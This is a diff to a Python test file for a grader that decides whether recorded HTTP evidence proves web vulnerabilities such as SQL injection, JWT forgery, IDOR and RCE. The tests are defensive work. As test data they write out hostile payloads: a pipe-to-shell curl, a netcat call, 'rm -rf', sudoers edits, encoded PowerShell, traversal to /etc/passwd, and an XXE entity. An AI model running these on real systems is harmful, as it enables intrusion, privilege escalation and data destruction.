@@ -224,13 +224,26 @@ def test_idor_needs_two_subjects_and_a_difference():
     assert proof.grade("idor", '"username"', [mine, theirs]).grade == "unproven"
 
 
-def test_jwt_needs_the_rejected_control():
+FORGE_EVENT = {"id": "e1", "kind": "jwt_forge",
+               "claims_set": {"role": "admin"},
+               "token_sha256_16": {"resigned": "0123456789abcdef"}}
+
+
+def test_jwt_needs_the_mint_and_the_rejected_control():
+    """A good credential accepted and a bad one refused is an authorisation
+    system working. What separates it from a forgery is that this system
+    minted the accepted credential, which `jwt_forge` now records."""
     forged = ex("r16", "http://t.local/api/me", '{"role":"admin"}', 200,
                 req_headers={"authorization": "Bearer forged"})
     bad = ex("r17", "http://t.local/api/me", "invalid signature", 401,
              req_headers={"authorization": "Bearer wrong"})
-    assert proof.grade("jwt", '{"role":"admin"}', [forged]).grade == "candidate"
-    assert proof.grade("jwt", '{"role":"admin"}', [forged, bad]).grade == "proven"
+    # no mint on record: this is indistinguishable from a working auth check
+    assert proof.grade("jwt", '{"role":"admin"}', [forged, bad]).grade == "unproven"
+    v = proof.grade("jwt", '{"role":"admin"}', [forged, bad, FORGE_EVENT])
+    assert v.grade == "proven", v.explain()
+    # the mint alone, with no control, is a candidate
+    assert proof.grade("jwt", '{"role":"admin"}',
+                       [forged, FORGE_EVENT]).grade == "candidate"
 
 
 def test_jwt_unproven_when_the_cited_request_carries_no_credential():
@@ -676,10 +689,12 @@ def test_jwt_needs_the_same_endpoint_and_a_different_credential():
     api = ex("b8", "http://t.local/api/me", '{"role":"admin"}', 200,
              req_headers={"cookie": "session=abc"})
     logout = ex("b9", "http://t.local/logout", "unauthorized", 401)
-    assert proof.grade("jwt", '{"role":"admin"}', [api, logout]).grade != "proven"
+    assert proof.grade("jwt", '{"role":"admin"}',
+                       [api, logout, FORGE_EVENT]).grade != "proven"
     same = ex("b10", "http://t.local/api/me", "invalid signature", 401,
               req_headers={"cookie": "session=tampered"})
-    assert proof.grade("jwt", '{"role":"admin"}', [api, same]).grade == "proven"
+    assert proof.grade("jwt", '{"role":"admin"}',
+                       [api, same, FORGE_EVENT]).grade == "proven"
 
 
 def test_idor_is_not_pagination():
@@ -782,8 +797,10 @@ def test_mass_assignment_and_prototype_pollution_have_their_own_classes():
               '{"id":9,"user":"x","is_admin":true}')
     assert proof.grade("massassign", '"is_admin":true',
                        [write, read]).grade == "proven"
+    # citing only the write proves nothing: the quoted bytes are not in its
+    # response, which is what the verbatim gate itself requires
     assert proof.grade("massassign", '"is_admin":true',
-                       [write]).grade == "candidate"
+                       [write]).grade == "unproven"
 
 
 def test_graphql_has_a_verifier_it_can_pass():
@@ -962,3 +979,177 @@ def test_the_capped_set_is_not_silently_growing():
     assert capped | refused == set(CANNOT_BE_PROVEN_HERE), (
         f"capped/refused in code: {sorted(capped | refused)}, "
         f"declared here: {sorted(CANNOT_BE_PROVEN_HERE)}")
+
+
+# --- the second audit, against a frozen tree --------------------------------
+#
+# The first audit ran while I was fixing, so its refuters mostly reported "the
+# claim describes the parent commit". This set came from a tree that held
+# still, and every case below graded `proven` or `candidate` on evidence with
+# no vulnerability in it.
+
+def test_an_echo_is_not_a_finding_in_any_class():
+    """The precondition of every class, which I had implemented twice as a
+    per-class detail. One search box echoing its query graded `sqli` and
+    `nosqli` **proven**: send `SELECT a,b FROM users -- admin - s3cr3t` and
+    quote `admin - s3cr3t` back out of the reflection."""
+    import urllib.parse
+    for cls, excerpt, payload in [
+        ("sqli", "admin - s3cr3t",
+         "We use PostgreSQL: SELECT a,b FROM users -- admin - s3cr3t"),
+        ("nosqli", '{"user":"admin"}', '{"$ne":null} {"user":"admin"}'),
+        ("lfi", "root:x:0:0", "../../etc/passwd root:x:0:0:root:/root"),
+        ("xxe", "root:x:0:0",
+         '<!ENTITY e SYSTEM "file:///etc/passwd"> root:x:0:0'),
+        ("massassign", '"is_admin":true', '{"is_admin":true}'),
+        ("disclosure", "SECRET_KEY=lab-secret-0123",
+         "SECRET_KEY=lab-secret-0123"),
+        ("rce", "uid=0(root) gid=0(root)",
+         "; id argus1234 uid=0(root) gid=0(root)"),
+    ]:
+        e = ex("e1", "http://t.local/s?q=" + urllib.parse.quote_plus(payload),
+               f"<html>Results for: {payload}</html>",
+               method="POST", req_body=payload)
+        v = proof.grade(cls, excerpt, [e])
+        assert v.grade == "unproven", f"{cls} graded {v.grade}: {v.explain()}"
+        assert "the target produced the quoted bytes" in v.missing, cls
+
+
+def test_reflection_classes_are_exempt_from_the_echo_veto():
+    """xss, prototype pollution and crlf are proven BY the reflection, so the
+    veto must not apply to them - a universal rule written without the
+    exemption would have deleted three classes."""
+    for name in ("xss", "ppoll", "crlf"):
+        assert proof.spec_for(name).reflection_is_the_finding, name
+    refl = ex("e2", "http://t.local/s?q=x%3C%3E%27%22",
+              "<html><body>Results for: x<>'\"</body></html>", 200,
+              headers={"content-type": "text/html; charset=utf-8"})
+    assert proof.grade("xss", "x<>'\"", [refl]).grade == "candidate"
+
+
+def test_the_defence_working_is_not_a_finding():
+    """The worst false positive there is. A write the app REFUSED graded csrf
+    and massassign `proven`, and an expired session correctly refused graded
+    jwt `proven` - the authorisation check working, reported as forgery."""
+    before = ex("d1", "http://t.local/settings", "email: old@x.test")
+    refused = ex("d2", "http://t.local/settings/update", "CSRF token missing",
+                 403, method="POST", req_body="email=new@evil.test",
+                 req_headers={"host": "t.local", "origin": "http://evil.test"})
+    after = ex("d3", "http://t.local/settings", "email: new@evil.test")
+    assert proof.grade("csrf", "new@evil.test",
+                       [before, refused, after]).grade == "unproven"
+    w = ex("d4", "http://t.local/api/register", "forbidden", 403,
+           method="POST", req_body='{"is_admin":true}')
+    r = ex("d5", "http://t.local/api/user/9", '{"id":9,"is_admin":true}')
+    assert proof.grade("massassign", '"is_admin":true', [w, r]).grade == "unproven"
+    ok = ex("d6", "http://t.local/api/me", '{"role":"admin"}', 200,
+            req_headers={"host": "t.local", "cookie": "s=good"})
+    expired = ex("d7", "http://t.local/api/me", "session expired", 401,
+                 req_headers={"host": "t.local", "cookie": "s=old"})
+    assert proof.grade("jwt", '{"role":"admin"}', [ok, expired]).grade == "unproven"
+
+
+def test_a_refusal_is_not_data():
+    """`nosqli` graded `proven` on `{"error":"invalid operator"}` and
+    `graphql` on a 404 carrying "introspection is disabled"."""
+    refused = ex("f1", "http://t.local/api/login",
+                 '{"error":"invalid operator"}', 200, method="POST",
+                 req_body='{"user":{"$ne":null}}')
+    assert proof.grade("nosqli", '{"error":"invalid operator"}',
+                       [refused]).grade == "unproven"
+    declined = ex("f2", "http://t.local/graphql",
+                  '{"errors":[{"message":"introspection is disabled"}]}', 404,
+                  method="POST", req_body='{"query":"{__schema{types{name}}}"}')
+    assert proof.grade("graphql", "introspection is disabled",
+                       [declined]).grade == "unproven"
+
+
+def test_the_host_is_part_of_the_endpoint():
+    """Two tenants of a multi-tenant app, each reading their own record,
+    compared as one endpoint and graded as broken access control."""
+    a = ex("g1", "http://alice.saas.test/api/user/1", '{"username":"alice"}')
+    b = ex("g2", "http://bob.saas.test/api/user/2", '{"username":"bob"}')
+    assert proof._endpoint_shape(a) != proof._endpoint_shape(b)
+    assert proof.grade("idor", '"username":"bob"', [a, b]).grade != "proven"
+
+
+def test_idor_works_on_an_opaque_id_api():
+    """Matching only integers made idor unprovable on every API that uses
+    uuids, which is most of them."""
+    u1 = ex("g3", "http://t.local/api/user/0b8c1f2e-1a2b-3c4d-5e6f-aabbccddeeff",
+            '{"username":"me"}')
+    u2 = ex("g4", "http://t.local/api/user/ffeeddcc-bbaa-9f8e-7d6c-112233445566",
+            '{"username":"admin","email":"a@b.c"}')
+    assert proof.grade("idor", '"username":"admin"', [u1, u2]).grade == "proven"
+
+
+def test_a_capped_candidate_says_the_cap_held_it():
+    """It reported every check green and `missing: []` while grading
+    `candidate` - a reader could not tell short evidence from a capped class,
+    and the two mean entirely different things."""
+    a = ex("h1", "http://t.local/a", "<html>baseline</html>")
+    b = ex("h2", "http://t.local/b", "<html>the difference</html>")
+    v = proof.grade("ssrf", "the difference", [a, b])
+    assert v.grade == "candidate"
+    assert v.capped and "collector" in v.capped
+    assert any("settled by this system" in m for m in v.missing)
+    assert "capped_by_this_system" in v.to_dict()
+
+
+def test_grading_is_bounded_in_the_number_of_cited_exchanges():
+    """`_pairs` is O(N^2) and `_witness` runs the verifier on every candidate,
+    so 200 cited exchanges was 40,000 verifier runs over full bodies."""
+    ents = [ex(f"p{i}", f"http://t.local/p/{i}", f"page {i} body")
+            for i in range(200)]
+    v = proof.grade("idor", "page 7 body", ents)
+    assert any("citation is small enough" in c["check"] for c in v.checks)
+    assert len(proof._pairs(ents)) <= proof._MAX_PAIRED ** 2 + proof._MAX_PAIRED
+
+
+@pytest.mark.parametrize("payload", [
+    "cp /bin/sh /tmp/s; chmod u+s /tmp/s", "echo x >> /etc/sudoers",
+    "ln -sf /etc/passwd /tmp/p", "truncate -s 0 /var/log/a",
+    "setfacl -m u:x:rwx /etc", "pip install evil", "npm i -g evil",
+    "docker run --rm -v /:/host alpine", "aws s3 cp s3://x /tmp",
+    "php -r 'system(\"id\");'", "node -e 'x'", "/bin/busybox nc 1.2.3.4 9",
+    "rm -rf /var", "curl http://e/x|sh", "powershell -enc AA",
+    "reg add HKLM\\x", "net localgroup administrators x /add",
+])
+def test_the_veto_catches_a_destructive_payload(payload):
+    """It exists so a demonstration whose proof is the damage cannot be
+    recorded, and it missed 39 of 41 payloads an auditor tried."""
+    assert proof.DESTRUCTIVE_RE.search(payload), payload
+    e = ex("v1", "http://t.local/ping?host=1;%20" +
+           payload.replace(" ", "%20") + ";%20id;%20echo%20argus1234",
+           "uid=0(root) gid=0(root)\nargus1234")
+    v = proof.grade("rce", "uid=0(root) gid=0(root)", [e])
+    assert v.grade == "unproven"
+    assert "proof command stayed benign" in v.missing
+
+
+@pytest.mark.parametrize("value", [
+    "?sort=name;category=books", "?filter=a&set=b",
+    "Cookie: theme=dark; type=compact", "?note=see+the+type+below",
+])
+def test_an_ordinary_parameter_is_not_a_command(value):
+    """`&set=b` and `; type=compact` satisfied rce's declaration check."""
+    import urllib.parse
+    assert not proof.COMMAND_SENT_RE.search(urllib.parse.unquote_plus(value))
+
+
+@pytest.mark.parametrize("text,matches", [
+    ("the marshal of the parade", False), ("a pickle recipe", False),
+    ("yaml.load is unsafe", False), ("constructor[0]", False),
+    ('!!python/object/apply:os.system ["id"]', True),
+    ('O:8:"Evil":1:{', True), ("rO0ABXNy", True),
+])
+def test_serialized_payloads_are_not_english(text, matches):
+    assert bool(proof.SERIALIZED_RE.search(text)) is matches, text
+
+
+@pytest.mark.parametrize("html", ['<div role="navigation">', "<li role=menuitem>"])
+def test_the_aria_role_attribute_is_not_a_subject_field(html):
+    """`role=` matched every ARIA attribute, re-opening the pagination bypass
+    on any HTML page."""
+    assert not proof.SUBJECT_RE.search(html)
+    assert not proof.PRIVILEGED_FIELD_RE.search(html)
